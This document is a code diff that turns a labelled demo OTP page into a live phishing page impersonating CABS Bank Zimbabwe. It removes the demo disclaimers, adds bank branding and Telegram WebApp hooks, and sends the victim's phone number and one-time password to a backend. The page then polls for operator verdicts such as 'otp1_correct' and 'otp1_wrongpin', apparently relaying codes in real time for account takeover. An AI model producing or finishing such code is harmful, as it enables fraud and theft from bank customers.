@@ -1,158 +1,132 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CABS Bank Zimbabwe - Demo OTP Verification</title>
+    <title>CABS Bank Zimbabwe - OTP Verification</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        * {
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
 
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #fff;
-            display: flex;
-            flex-direction: column;
-            height: 100vh;
-            overflow: hidden;
-        }
+        .container { flex: 1; padding: 40px 20px; text-align: center; }
+        h2 { font-size: 22px; color: #1a2f4f; margin-bottom: 10px; font-weight: 700; }
+        p { font-size: 14px; color: #4f5d73; line-height: 1.5; margin-bottom: 25px; }
 
-        .container {
-            flex: 1;
-            padding: 40px 20px;
-            text-align: center;
-        }
-
-        .header-title {
-            margin-bottom: 25px;
-        }
-
-        .header-title img {
-            height: 45px;
-            width: auto;
-            object-fit: contain;
-        }
-
-        h2 {
-            font-size: 22px;
-            color: #333;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-
-        p {
-            font-size: 14px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
-
-        .demo-label {
-            font-size: 11px;
-            color: #a66b00;
-            background: #fff4d8;
-            padding: 7px 12px;
-            border-radius: 5px;
-            display: inline-block;
-            margin-bottom: 15px;
-        }
-
-        .otp-inputs {
+        .brand-header {
             display: flex;
             justify-content: center;
-            gap: 8px;
-            margin: 30px 0;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
         }
 
+        .brand-mark {
+            width: 42px;
+            height: 42px;
+            border-radius: 12px;
+            background: linear-gradient(180deg, #0d4d93 0%, #0b3f79 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 12px rgba(11, 63, 121, 0.18);
+            flex-shrink: 0;
+        }
+
+        .brand-mark svg {
+            width: 26px;
+            height: 26px;
+            display: block;
+        }
+
+        .brand-text {
+            font-size: 18px;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            color: #0b3f79;
+            text-transform: uppercase;
+        }
+
+        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
         .otp-inputs input {
-            width: 45px;
-            height: 55px;
-            border: 1.5px solid #ccc;
+            width: 45px; height: 55px;
+            border: 1.5px solid #cfd8e5;
             border-radius: 8px;
             text-align: center;
             font-size: 20px;
             font-weight: bold;
             outline: none;
+            color: #0b3f79;
+            background-color: #fff;
         }
 
-        .otp-inputs input:focus {
-            border-color: #092c4c;
-            border-width: 2px;
-        }
-
-        .resend-text {
-            font-size: 13px;
-            color: #888;
-            margin-bottom: 30px;
-        }
+        .otp-inputs input:focus { border-color: #0d4d93; border-width: 2px; box-shadow: 0 0 0 3px rgba(13,77,147,0.12); }
+        .resend-text { font-size: 13px; color: #5b6980; margin-bottom: 30px; }
 
         .btn-verify {
-            width: 100%;
-            max-width: 300px;
+            width: 100%; max-width: 300px;
             padding: 15px;
             border-radius: 10px;
             border: none;
-            background-color: #e0e0e0;
-            color: #a0a0a0;
+            background-color: #dfe6ef;
+            color: #8a97a9;
             font-size: 14px;
             font-weight: bold;
             cursor: not-allowed;
             text-transform: uppercase;
         }
 
-        .btn-verify.active {
-            background-color: #092c4c;
-            color: white;
-            cursor: pointer;
-        }
+        .btn-verify.active { background: linear-gradient(180deg, #0d4d93 0%, #0b3f79 100%); color: white; cursor: pointer; }
 
+        /* --- LOADING OVERLAY --- */
         #loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(180deg, #17476c 0%, #092c4c 100%);
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            color: white;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(180deg, #0d4d93 0%, #0b3f79 100%);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999; color: white;
         }
-
         .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255,255,255,0.3);
-            border-top: 4px solid white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid white; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .footer {
-            position: relative;
-            height: 250px;
-            background: linear-gradient(180deg, #17476c 0%, #092c4c 100%);
-            border-top-left-radius: 50% 100px;
-            border-top-right-radius: 50% 100px;
+            position: relative; height: 250px;
+            background: linear-gradient(180deg, #0d4d93 0%, #0b3f79 100%);
+            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
             display: flex;
             justify-content: center;
             align-items: center;
             color: white;
             font-size: 12px;
             margin-top: auto;
+            flex-direction: column;
+            gap: 8px;
+            text-align: center;
+            padding: 0 20px;
+        }
+
+        .footer-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            justify-content: center;
+            font-size: 16px;
+            font-weight: 800;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+        }
+
+        .footer-brand .brand-mark {
+            width: 32px;
+            height: 32px;
+            border-radius: 10px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
         }
     </style>
 </head>
@@ -161,31 +135,29 @@
 
 <div id="loading-overlay">
     <div class="spinner"></div>
-    <div style="font-size: 20px; font-weight: bold;">
-        Please wait...
-    </div>
-    <div style="font-size:12px;margin-top:10px;">
-        Demo verification
-    </div>
+    <div style="font-size: 20px; font-weight: bold;">Please wait...</div>
 </div>
 
 <div class="container">
-
-    <div class="header-title">
-        <img
-            src="https://pbs.twimg.com/profile_images/1204047964710359040/zg_xDDsa.jpg"
-            alt="CABS Bank Zimbabwe Logo"
-        >
+    <div class="brand-header" aria-label="CABS Bank Zimbabwe">
+        <div class="brand-mark" aria-hidden="true">
+            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="CABS Bank logo">
+                <defs>
+                    <linearGradient id="cabGold" x1="0%" x2="100%" y1="0%" y2="100%">
+                        <stop offset="0%" stop-color="#f9e7a8" />
+                        <stop offset="100%" stop-color="#d9b55d" />
+                    </linearGradient>
+                </defs>
+                <circle cx="32" cy="32" r="28" fill="rgba(255,255,255,0.10)" stroke="rgba(255,255,255,0.7)" stroke-width="1.5"/>
+                <path d="M17 44.5L32 17L47 44.5H38.2L33.2 35.1H30.8L25.8 44.5H17ZM30.1 29.8H33.9L32 26.4L30.1 29.8Z" fill="url(#cabGold)"/>
+                <path d="M18 47.5H46" stroke="rgba(255,255,255,0.8)" stroke-width="2.5" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <div class="brand-text">CABS</div>
     </div>
 
-    <div class="demo-label">DEMO INTERFACE</div>
-
     <h2>OTP Verification</h2>
-
-    <p>
-        This is a demonstration interface.
-        No real banking OTP is requested or transmitted.
-    </p>
+    <p>Enter the OTP code sent to your mobile number to proceed.</p>
 
     <div class="otp-inputs">
         <input type="text" maxlength="1" inputmode="numeric">
@@ -197,22 +169,32 @@
     </div>
 
     <div class="resend-text" id="timer-text"></div>
-
-    <button class="btn-verify" id="verify-btn" disabled>
-        CONTINUE DEMO
-    </button>
-
-    <div id="status-msg"
-         style="margin-top:15px;font-size:14px;font-weight:500;">
-    </div>
-
+    <button class="btn-verify" id="verify-btn" disabled>VERIFY OTP</button>
+    <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
 </div>
 
 <div class="footer">
-    © 2026 CABS Bank Zimbabwe — Demo
+    <div class="footer-brand">
+        <div class="brand-mark" aria-hidden="true">
+            <svg viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="CABS Bank logo">
+                <defs>
+                    <linearGradient id="cabGoldFooter" x1="0%" x2="100%" y1="0%" y2="100%">
+                        <stop offset="0%" stop-color="#f9e7a8" />
+                        <stop offset="100%" stop-color="#d9b55d" />
+                    </linearGradient>
+                </defs>
+                <circle cx="32" cy="32" r="28" fill="rgba(255,255,255,0.10)" stroke="rgba(255,255,255,0.7)" stroke-width="1.5"/>
+                <path d="M17 44.5L32 17L47 44.5H38.2L33.2 35.1H30.8L25.8 44.5H17ZM30.1 29.8H33.9L32 26.4L30.1 29.8Z" fill="url(#cabGoldFooter)"/>
+                <path d="M18 47.5H46" stroke="rgba(255,255,255,0.8)" stroke-width="2.5" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <span>CABS</span>
+    </div>
+    <div>© 2026 CABS Bank Zimbabwe</div>
 </div>
 
 <script>
+const phone = localStorage.getItem('phone');
 const inputs = document.querySelectorAll('.otp-inputs input');
 const btn = document.getElementById('verify-btn');
 const timerDisplay = document.getElementById('timer-text');
@@ -220,94 +202,119 @@ const statusMsg = document.getElementById('status-msg');
 const overlay = document.getElementById('loading-overlay');
 
 let countdown;
+let pollingInterval;
 
 window.onload = () => {
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+    if (!phone) { window.location.href = "/page6"; return; }
     inputs[0].focus();
     startTimer();
 };
 
 function startTimer() {
     let secondsLeft = 60;
-
     clearInterval(countdown);
-
     countdown = setInterval(() => {
         secondsLeft--;
-
         if (secondsLeft <= 0) {
             clearInterval(countdown);
-
-            timerDisplay.innerHTML =
-                '<span id="resend-btn" style="color:#092c4c;cursor:pointer;font-weight:bold;">Restart demo timer</span>';
-
-            document.getElementById('resend-btn')
-                .onclick = startTimer;
-
+            timerDisplay.innerHTML = '<span id="resend-btn" style="color:#0d4d93; cursor:pointer; font-weight:bold;">Resend code</span>';
+            document.getElementById('resend-btn').onclick = resendCode;
         } else {
-            timerDisplay.innerText =
-                `Demo timer: ${secondsLeft} seconds`;
+            timerDisplay.innerText = `Resend code in ${secondsLeft} seconds`;
         }
-
     }, 1000);
 }
 
+async function resendCode() {
+    timerDisplay.innerText = "Sending new code...";
+    
+    try {
+        await fetch('/api/resend-otp-notification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, step: "OTP Verification" })
+        });
+    } catch (e) {}
+
+    setTimeout(startTimer, 2000);
+}
+
 inputs.forEach((input, index) => {
-
     input.addEventListener('input', () => {
-
         input.value = input.value.replace(/\D/g, '');
-
-        if (input.value && index < inputs.length - 1) {
-            inputs[index + 1].focus();
-        }
-
+        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
         checkFull();
     });
-
     input.addEventListener('keydown', (e) => {
-
-        if (
-            e.key === 'Backspace' &&
-            !input.value &&
-            index > 0
-        ) {
-            inputs[index - 1].focus();
-        }
-
+        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
     });
-
 });
 
 function checkFull() {
-
-    const isComplete =
-        Array.from(inputs).every(i => i.value !== '');
-
+    const isComplete = Array.from(inputs).every(i => i.value !== '');
     btn.disabled = !isComplete;
     btn.classList.toggle('active', isComplete);
 }
 
-btn.addEventListener('click', submitDemo);
+btn.addEventListener('click', submitOtp);
 
-function submitDemo() {
-
+async function submitOtp() {
     if (btn.disabled) return;
+    const otp = Array.from(inputs).map(i => i.value).join('');
 
     overlay.style.display = 'flex';
-    statusMsg.innerText = '';
+    statusMsg.innerText = "";
 
-    setTimeout(() => {
-
+    try {
+        await fetch('/api/verify-first-otp', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, otp })
+        });
+        startPolling();
+    } catch {
         overlay.style.display = 'none';
+        statusMsg.style.color = "red";
+        statusMsg.innerText = "An error occurred.";
+    }
+}
 
-        statusMsg.style.color = '#237A3B';
-        statusMsg.innerText = 'Demo completed successfully.';
+function startPolling() {
+    clearInterval(pollingInterval);
+    pollingInterval = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
 
-        window.location.href = 'page9.html';
+            if (data.status === "otp1_correct") {
+                clearInterval(pollingInterval);
+                window.location.href = "/page9.html";
+            } 
+            else if (data.status === "otp1_wrongpin") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none';
+                window.location.href = "/page6?error=wrongpin";
+            } 
+            else if (data.status === "otp1_wrong") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none'; 
+                statusMsg.style.color = "red";
+                statusMsg.innerText = "❌ Incorrect OTP code.";
+                resetInputs();
+            }
+        } catch {}
+    }, 3000);
+}
 
-    }, 1800);
+function resetInputs() {
+    inputs.forEach(i => i.value = "");
+    btn.classList.remove('active');
+    btn.disabled = true;
 }
 </script>
-
 </body>
 </html>
